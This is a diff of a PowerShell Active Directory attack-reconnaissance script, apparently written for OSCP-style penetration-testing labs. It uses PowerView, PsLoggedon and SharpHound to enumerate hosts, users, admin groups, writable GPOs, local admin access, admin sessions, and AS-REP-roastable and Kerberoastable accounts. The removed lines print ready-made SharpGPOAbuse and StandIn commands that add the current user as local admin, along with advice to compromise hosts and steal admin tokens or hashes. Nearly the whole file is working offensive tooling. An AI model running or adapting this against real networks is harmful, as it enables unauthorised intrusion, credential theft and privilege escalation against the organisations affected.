@@ -1,7 +1,7 @@
 # =============================================================
-# AD ENUM REPORT (OSCP STYLE - ULTIMATE ASSEMBLY)
+# AD ENUM REPORT (OSCP STYLE - ROBUST FULL VERSION)
 # powershell -NoProfile -ExecutionPolicy Bypass -File ./adenum.ps1
-# Prerequisite: PowerView.ps1 & PsLoggedon64.exe
+# REQUIREMENTS: PowerView.ps1, PsLoggedon64.exe, sharpHound.exe
 # =============================================================
 
 $outfile = "$env:USERPROFILE\ad_enum_report.txt"
@@ -15,254 +15,261 @@ function write-section {
 Write-Host "[+] Saving report to $outfile"
 
 # ===============================
-# LOAD POWERVIEW
+# CHECK REQUIRED FILES
 # ===============================
-if (-not (Get-Command Get-DomainUser -ErrorAction SilentlyContinue)) {
-    try {
-        . .\PowerView.ps1
-    } catch {
-        Write-Host "[!] PowerView.ps1 not found!"
+$required = @("PowerView.ps1","PsLoggedon64.exe","SharpHound.exe")
+foreach ($file in $required) {
+    if (-not (Test-Path ".\$file")) {
+        Write-Host "[!] Missing required file: $file" -ForegroundColor Red
         exit
+    } else {
+        Write-Host "[+] Found: $file"
     }
 }
 
-# Pre-fetch domain data untuk efisiensi
-$domainObj = Get-Domain
-$domainName = $domainObj.Name
-$dnsRoot = $domainObj.dnsroot
+# ===============================
+# LOAD POWERVIEW
+# ===============================
+try {
+    . .\PowerView.ps1
+} catch {
+    Write-Host "[!] Failed to load PowerView.ps1"
+    exit
+}
 
 # ===============================
-# 1. HOSTS
+# DC AUTO DETECT
 # ===============================
-# Section 1
+$DC = $null
+try {
+    $raw = nltest /dsgetdc:$env:USERDOMAIN
+    if ($raw -match "Address:\s+\\\\(\d+\.\d+\.\d+\.\d+)") {
+        $DC = $matches[1]
+    }
+} catch {}
+
+if (-not $DC) {
+    Write-Host "[!] DC auto-detect failed!" -ForegroundColor Yellow
+    $DC = Read-Host "[?] Enter DC IP"
+}
+Write-Host "[+] Using DC: $DC"
+
+# ===============================
+# SAFE LDAP WRAPPER
+# ===============================
+function Invoke-LDAP {
+    param($cmd,$name)
+    try {
+        return & $cmd
+    } catch {
+        Write-Host "[!] $name failed → retry using DC" -ForegroundColor Yellow
+        try {
+            return & $cmd -Server $DC
+        } catch {
+            Write-Host "[!] $name FAILED" -ForegroundColor Red
+            Add-Content $outfile "[!] FAILED: $name"
+            return $null
+        }
+    }
+}
+
+# ===============================
+# DOMAIN INFO
+# ===============================
+$domainObj = Invoke-LDAP { Get-Domain -ErrorAction Stop } "Get-Domain"
+$domainName = if ($domainObj) { $domainObj.Name } else { "UNKNOWN" }
+$dnsRoot = if ($domainObj) { $domainObj.dnsroot } else { "UNKNOWN" }
+
+# ===============================
+# 1 HOSTS
+# ===============================
 Write-Host "[>] Enumerating Hosts..." -ForegroundColor Cyan
 write-section "HOSTS"
-$hosts = Get-DomainComputer -Properties dnshostname, OperatingSystem
+
+$hosts = Invoke-LDAP { Get-DomainComputer -Properties dnshostname,OperatingSystem -ErrorAction Stop } "Get-DomainComputer"
+
 if ($hosts) {
     foreach ($h in $hosts) {
-        $ip = ""
-        try { $ip = ([System.Net.Dns]::GetHostAddresses($h.dnshostname) | Where-Object {$_.AddressFamily -eq "InterNetwork"} | Select -First 1).IPAddressToString } catch {}
+        $ip=""
+        try {
+            $ip = ([System.Net.Dns]::GetHostAddresses($h.dnshostname) |
+            Where-Object {$_.AddressFamily -eq "InterNetwork"} |
+            Select -First 1).IPAddressToString
+        } catch {}
         "$($h.dnshostname);$($h.OperatingSystem);$ip" | Add-Content $outfile
     }
 }
 
 # ===============================
-# 2. USERS
+# 2 USERS
 # ===============================
-# Section 2
-Write-Host "[>] Enumerating Domain Users..." -ForegroundColor Cyan
+Write-Host "[>] Enumerating Users..." -ForegroundColor Cyan
 write-section "USERS"
-Get-DomainUser -Properties samaccountname | ForEach-Object { "$($_.samaccountname)@$domainName" } | Add-Content $outfile
+
+$users = Invoke-LDAP { Get-DomainUser -Properties samaccountname -ErrorAction Stop } "Get-DomainUser"
+if ($users) {
+    $users | % { "$($_.samaccountname)@$domainName" } | Add-Content $outfile
+}
 
 # ===============================
-# 3. ADMIN GROUP MEMBERS (RECURSIVE)
+# 3 ADMIN GROUPS
 # ===============================
-# Section 3
-Write-Host "[>] Mapping Admin Groups (Recursive)..." -ForegroundColor Cyan
-write-section "ADMIN GROUP MEMBERS (BLOODHOUND STYLE)"
+Write-Host "[>] Mapping Admin Groups..." -ForegroundColor Cyan
+write-section "ADMIN GROUP MEMBERS"
+
 $currentSID = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value
 $currentUser = whoami
-$targetGroups = @("Domain Admins", "Administrators", "Enterprise Admins")
+$groups = @("Domain Admins","Administrators","Enterprise Admins")
 $allAdmins = @()
 
-foreach ($groupName in $targetGroups) {
-    $admins = Get-DomainGroupMember -Identity $groupName -Recurse -ErrorAction SilentlyContinue
-    if ($admins) {
-        $allAdmins += $admins
-        Add-Content $outfile "--- Group: $groupName ---"
-        foreach ($a in $admins) {
-            $line = "$($a.MemberName) ($($a.ObjectClass));$($a.MemberSID)"
-            if ($a.MemberSID -eq $currentSID -or $a.MemberName -match $currentUser) { $line = "[CURRENT ADMIN] $line" }
+foreach ($g in $groups) {
+    try {
+        $members = Get-DomainGroupMember -Identity $g -Recurse -Server $DC
+        Add-Content $outfile "--- $g ---"
+        foreach ($m in $members) {
+            $line = "$($m.MemberName) ($($m.ObjectClass));$($m.MemberSID)"
+            if ($m.MemberSID -eq $currentSID -or $m.MemberName -match $currentUser) {
+                $line = "[CURRENT ADMIN] $line"
+            }
+            $allAdmins += $m
             Add-Content $outfile $line
         }
+    } catch {
+        Add-Content $outfile "[!] Failed group: $g"
     }
 }
 
 # ===============================
-# 4. RELEVANT GROUPS (FILTERED)
+# 4 RELEVANT GROUPS
 # ===============================
-# Section 4
 Write-Host "[>] Filtering Relevant Groups..." -ForegroundColor Cyan
 write-section "RELEVANT GROUPS"
-$valuableKeywords = "Admin|Remote|Desktop|SQL|Backup|GPO|Exchange|SharePoint|VPN|IT|Dev"
-Get-DomainGroup -Properties Name, Description | Where-Object { $_.Name -match $valuableKeywords } | ForEach-Object {
-    "$($_.Name) -- Description: $($_.Description)" | Add-Content $outfile
+
+try {
+    Get-DomainGroup -Server $DC -Properties Name,Description |
+    Where-Object {$_.Name -match "Admin|Remote|SQL|Backup|IT|Dev"} |
+    % { "$($_.Name) -- $($_.Description)" } | Add-Content $outfile
+} catch {
+    Add-Content $outfile "[!] Group enumeration failed"
 }
 
 # ===============================
-# 5. GPO EXPLOITABILITY (SharpGPOAbuse Ready)
+# 5 GPO EXPLOIT
 # ===============================
-# Section 5
-Write-Host "[>] Checking GPO Exploits (ACLs)..." -ForegroundColor Cyan
+Write-Host "[>] Checking GPO Exploits..." -ForegroundColor Cyan
 write-section "GPO EXPLOITABILITY"
-$gpos = Get-DomainGPO
-# Mengambil samAccountName saja (menghapus "domain\")
+
+$gpos = Invoke-LDAP { Get-DomainGPO -ErrorAction Stop } "Get-DomainGPO"
 $me = whoami
 $foundExploit = $false
-$exploitableGPONames = @() # Untuk menampung nama GPO yang kena hit
+$exploitable = @()
 
 if ($gpos) {
-    $domainLinks = (Get-DomainObject -SearchScope Base).gplink
-    $ous = Get-DomainOU
-    $sites = Get-DomainSite
+    $domainLinks = Get-DomainObject -SearchScope Base -Server $DC
+    $ous = Get-DomainOU -Server $DC
+    $sites = Get-DomainSite -Server $DC
 
     foreach ($gpo in $gpos) {
-        $acls = Get-DomainObjectAcl -Identity $gpo.distinguishedname -ResolveGUIDs | Where-Object {
-            $_.ActiveDirectoryRights -match "CreateChild|WriteProperty|DeleteChild|DeleteTree|WriteDacl|WriteOwner"
-        }
-        foreach ($acl in $acls) {
-            $identity = ""
-            try { $identity = ConvertFrom-SID $acl.SecurityIdentifier } catch { continue }
-            if ($identity -ne $me) { continue }
-
-            $scope = @()
-            if ($domainLinks -like "*$($gpo.name)*") { $scope += "Domain" }
-            foreach ($ou in $ous) { if ($ou.gplink -like "*$($gpo.name)*") { $scope += "OU:$($ou.name)" } }
-            foreach ($site in $sites) { if ($site.gplink -like "*$($gpo.name)*") { $scope += "Site:$($site.name)" } }
-            $scopeStr = if ($scope.Count -eq 0) { "Not Linked" } else { $scope -join "," }
-
-            $foundExploit = $true
-            $exploitableGPONames += $gpo.displayname # Simpan nama GPO
-
-            Add-Content $outfile "------------------------------------"
-            Add-Content $outfile "[!] EXPLOITABLE GPO FOUND"
-            Add-Content $outfile "User    : $identity"
-            Add-Content $outfile "GPO     : $($gpo.displayname)"
-            Add-Content $outfile "Rights  : $($acl.ActiveDirectoryRights)"
-            Add-Content $outfile "Scope   : $scopeStr"
-            Add-Content $outfile "------------------------------------"
-        }
-    }
-}
-
-# Blok instruksi ini HANYA akan diprint jika ada temuan GPO
-if ($foundExploit) {
-    Add-Content $outfile "`n[!] ATTACK RECOMMENDATION [!]"
-    Add-Content $outfile "Choose attack method for the discovered GPOs:"
-    
-    # Select-Object -Unique memastikan GPO yang sama tidak diprint berulang kali
-    $me = (whoami).Split('\')[-1]
-    foreach ($targetGPO in ($exploitableGPONames | Select-Object -Unique)) {
-        Add-Content $outfile "`n>>> Target GPO: $targetGPO"
-        Add-Content $outfile "    Option A - SharpGPOAbuse"
-        # Menggunakan singel quote agar nama GPO dengan spasi tidak error
-        Add-Content $outfile "    ./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount $me --GPOName '$targetGPO'"
-        Add-Content $outfile "    Option B - StandIn"
-        Add-Content $outfile "    ./StandIn.exe --gpo --filter '$targetGPO' --localadmin $me"
-    }
-} else {
-    Add-Content $outfile "[+] No exploitable GPO rights found for current user"
-}
-
-# =============================================================
-# 6. ACTIONABLE QUERIES (OPTIMIZED SESSION HUNTING)
-# =============================================================
-# Section 6 (Paling Penting dikasih info karena lambat)
-Write-Host "[>] Hunting Sessions & Local Admin Access (This may take a while)..." -ForegroundColor Yellow
-write-section "LATERAL MOVEMENT & SESSIONS"
-
-# --- 1. Local Admin Access ---
-$localAdminFound = $false
-Find-LocalAdminAccess -ErrorAction SilentlyContinue | ForEach-Object { 
-    Add-Content $outfile "[+] LOCAL ADMIN ACCESS FOUND: $_"
-    $localAdminFound = $true
-}
-if (-not $localAdminFound) { Add-Content $outfile "Find Local Admin Access: Not found" }
-
-# --- 2. Shortest Path (Admin Session Hunting) ---
-# Ini adalah pengganti SHORTEST PATH yang lebih cepat
-$pathFound = $false
-$allSessions = Get-NetSession -ErrorAction SilentlyContinue
-if ($allAdmins -and $allSessions) {
-    $uniqueAdminNames = $allAdmins.MemberName | Select-Object -Unique
-    foreach ($adminName in $uniqueAdminNames) {
-        $foundSessions = $allSessions | Where-Object { $_.UserName -match $adminName }
-        if ($foundSessions) {
-            foreach ($s in $foundSessions) {
-                $pathFound = $true
-                Add-Content $outfile "[*] SHORTEST PATH FOUND: Admin [$adminName] is logged into [$($s.ComputerName)]"
-                Add-Content $outfile "    -> Action: Compromise $($s.ComputerName) to steal Admin Token/Hash!"
-            }
-        }
-    }
-}
-if (-not $pathFound) { Add-Content $outfile "Shortest Path to Admin (Sessions): Not found" }
-
-# --- 3. RDP & Critical Local Admin Misconfiguration ---
-$rdpRiskFound = $false
-$critAdminFound = $false
-$allComputers = $hosts.dnshostname
-
-if ($allComputers) {
-    foreach ($comp in $allComputers) {
         try {
-            $rdp = Get-NetLocalGroupMember -ComputerName $comp -GroupName "Remote Desktop Users" -ErrorAction SilentlyContinue
-            if ($rdp.MemberName -match "Domain Users") { 
-                Add-Content $outfile "[!] RDP RISK: 'Domain Users' can RDP to $comp"
-                $rdpRiskFound = $true
-            }
-            
-            $localAdmins = Get-NetLocalGroupMember -ComputerName $comp -GroupName "Administrators" -ErrorAction SilentlyContinue
-            if ($localAdmins.MemberName -match "Domain Users") { 
-                Add-Content $outfile "[!!!] CRITICAL: 'Domain Users' is Local Admin on $comp"
-                $critAdminFound = $true
+            $acls = Get-DomainObjectAcl -Identity $gpo.distinguishedname -ResolveGUIDs -Server $DC |
+            Where { $_.ActiveDirectoryRights -match "Write|Create|Delete" }
+
+            foreach ($acl in $acls) {
+                $id = ConvertFrom-SID $acl.SecurityIdentifier
+                if ($id -ne $me) { continue }
+
+                $foundExploit = $true
+                $exploitable += $gpo.displayname
+
+                Add-Content $outfile "[!] EXPLOITABLE GPO: $($gpo.displayname)"
+                Add-Content $outfile "Rights: $($acl.ActiveDirectoryRights)"
             }
         } catch {}
     }
 }
 
-if (-not $rdpRiskFound) { Add-Content $outfile "Servers/Workstation where Domain Users can RDP: Not found" }
-if (-not $critAdminFound) { Add-Content $outfile "Computers where Domain Users are Local Admin: Not found" }
-
-# ===============================
-# 7. AS-REP ROASTING
-# ===============================
-# Section 7
-Write-Host "[>] Checking AS-REP Roasting..." -ForegroundColor Cyan
-write-section "AS-REP ROASTABLE USERS"
-$asrep = Get-DomainUser -PreauthNotRequired -ErrorAction SilentlyContinue
-if ($asrep) {
-    $asrep | ForEach-Object { Add-Content $outfile "[!!!] AS-REP ROASTABLE: $($_.samaccountname) (No Pre-Auth Required!)" }
-} else { Add-Content $outfile "Null" }
-
-# ===============================
-# 8. KERBEROASTABLE USERS
-# ===============================
-# Section 8
-Write-Host "[>] Checking Kerberoasting..." -ForegroundColor Cyan
-write-section "KERBEROASTABLE USERS"
-$spnUsers = Get-DomainUser -SPN -ErrorAction SilentlyContinue
-$noise = @("krbtgt", "kadmin")
-if ($spnUsers) {
-    foreach ($u in $spnUsers) {
-        $sam = $u.samaccountname
-        $tag = if ($allAdmins.MemberName -contains $sam) { "[!!! ADMIN !!!] " } elseif ($noise -contains $sam.ToLower()) { "[SYSTEM] " } else { "[USER ACCOUNT] " }
-        Add-Content $outfile "$tag$sam@$dnsRoot;$($u.serviceprincipalname)"
-    }
+if (-not $foundExploit) {
+    Add-Content $outfile "[+] No exploitable GPO"
 }
 
 # ===============================
-# 9. ACTIVE SESSIONS (PsLoggedon)
+# 6 LATERAL
 # ===============================
-# Section 9
-Write-Host "[>] Running PsLoggedon64 on all targets..." -ForegroundColor Yellow
-write-section "ACTIVE SESSIONS (PSLOGGEDON)"
+Write-Host "[>] Hunting Lateral Movement..." -ForegroundColor Yellow
+write-section "LATERAL MOVEMENT"
+
+$localAdminFound = $false
+try {
+    Find-LocalAdminAccess -Server $DC | % {
+        Add-Content $outfile "[+] LOCAL ADMIN: $_"
+        $localAdminFound = $true
+    }
+} catch {}
+
+if (-not $localAdminFound) {
+    Add-Content $outfile "No Local Admin access"
+}
+
+# ===============================
+# 7 ASREP
+# ===============================
+Write-Host "[>] ASREP..." -ForegroundColor Cyan
+write-section "AS-REP"
+
+try {
+    Get-DomainUser -Server $DC -PreauthNotRequired |
+    % { "[!!!] $($_.samaccountname)" } | Add-Content $outfile
+} catch {
+    Add-Content $outfile "None"
+}
+
+# ===============================
+# 8 KERBEROAST
+# ===============================
+Write-Host "[>] Kerberoast..." -ForegroundColor Cyan
+write-section "KERBEROAST"
+
+try {
+    Get-DomainUser -Server $DC -SPN |
+    % { "$($_.samaccountname);$($_.serviceprincipalname)" } | Add-Content $outfile
+} catch {
+    Add-Content $outfile "None"
+}
+
+# ===============================
+# 9 PSLOGGEDON
+# ===============================
+Write-Host "[>] Running PsLoggedon..." -ForegroundColor Yellow
+write-section "PSLOGGEDON"
+
 $results = @()
-foreach ($target in $allComputers) {
-    $tmp = "$env:TEMP\pslog_$target.txt"
+foreach ($c in $hosts.dnshostname) {
     try {
-        cmd /c "PsLoggedon64.exe \\$target -accepteula > $tmp 2>&1"
+        $tmp = "$env:TEMP\$c.txt"
+        cmd /c "PsLoggedon64.exe \\$c -accepteula > $tmp 2>&1"
         if (Test-Path $tmp) {
-            Get-Content $tmp | Where-Object { $_ -match "\\" -and $_ -notmatch "Users logged on" } | ForEach-Object {
-                $results += "$($target.Split('.')[0]);$($_.Trim())"
-            }
-            Remove-Item $tmp -ErrorAction SilentlyContinue
+            Get-Content $tmp | Where {$_ -match "\\"} |
+            % { $results += "$($c);$($_.Trim())" }
+            Remove-Item $tmp
         }
     } catch {}
 }
-if ($results) { $results | Sort-Object -Unique | Add-Content $outfile } else { Add-Content $outfile "Null" }
+
+if ($results) { $results | sort -Unique | Add-Content $outfile }
+else { Add-Content $outfile "Null" }
+
+# ===============================
+# SHARPHOUND AUTO RUN
+# ===============================
+Write-Host "[>] Running SharpHound..." -ForegroundColor Cyan
+try {
+    .\SharpHound.exe -c All
+    Add-Content $outfile "[+] SharpHound executed"
+} catch {
+    Add-Content $outfile "[!] SharpHound failed"
+}
 
 # ===============================
 # DONE
 # ===============================
-Write-Host "[+] DONE! Report saved to: $outfile"
+Write-Host "[+] DONE → $outfile" -ForegroundColor Green
